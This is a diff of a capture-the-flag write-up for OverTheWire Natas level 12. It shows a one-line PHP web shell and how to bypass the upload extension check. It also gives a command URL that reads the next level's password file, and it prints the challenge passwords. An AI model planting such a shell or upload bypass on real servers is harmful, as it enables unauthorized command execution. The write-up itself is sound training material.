@@ -1,37 +1,39 @@
-# Natas Level 12 → Level 13
+<div style="font-family: 'Times New Roman', Times, serif; font-size: 12pt;">
+
+# OverTheWire Natas — Level 12
 
 ## Objective
-Retrieve the password by abusing insecure file upload validation.
 
-## Environment
-- Web-based challenge (OverTheWire Natas)
-- Access via web browser
-- HTTP Basic Authentication
+Exploit an unrestricted file upload vulnerability to upload a PHP web shell and execute arbitrary commands on the server.
 
-## Challenge Overview
-The application provides a file upload feature with restrictions on file type.  
-Only image files are supposedly allowed to be uploaded.
+## Access
 
-The validation is weak and relies on client-controlled values.
+* URL: http://natas12.natas.labs.overthewire.org/
+* Username: natas12
+* Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
-## Approach
-The file type check is performed using the file extension and/or client-supplied metadata.  
-By uploading a file with a valid image extension but containing executable code, server-side execution can be achieved.
+## Method
 
-Once code execution is available, the password file can be read directly.
+The application allows users to upload a JPEG image file. Inspecting the source code reveals that while the server generates a random filename, it relies on a hidden form field (`<input type="hidden" name="filename" value="...">`) to determine the file extension.
 
-## Steps Taken
-1. Open the Natas Level 12 webpage.
-2. Inspect the upload form and validation logic.
-3. Prepare a malicious file with an allowed extension.
-4. Upload the file to the server.
-5. Access the uploaded file to execute code.
-6. Read and extract the password.
-
-## Tools Used
-- Web Browser
-- File upload manipulation
-- Manual payload crafting
+1.  **Create a Payload:** Create a text file containing a simple PHP shell:
+    ```php
+    <?php passthru($_GET['cmd']); ?>
+    ```
+2.  **Intercept and Modify:** Upload this file (saved as `shell.php`). Since the browser might try to enforce image extensions or the form defaults to `.jpg`, intercept the HTTP request using a proxy tool (like Burp Suite) or modify the HTML element in the browser's Developer Tools. Change the `filename` value from `randomString.jpg` to `shell.php`.
+3.  **Execute:** After uploading, the server provides a link to the file (e.g., `upload/shell.php`). Access this URL and append the command to read the password:
+    `upload/shell.php?cmd=cat /etc/natas_webpass/natas13`
 
 ## Result
-The password for **Natas Level 13** was successfully retrieved by exploiting insecure file upload handling.
+
+Password for the next level obtained successfully.
+
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+
+## Key Takeaway
+
+* Never trust user input for file naming or file extensions.
+* File uploads should be validated server-side by checking the actual file content (Magic Bytes), not just the extension or MIME type provided by the client.
+* Uploaded files should not be executable in the upload directory.
+</div>
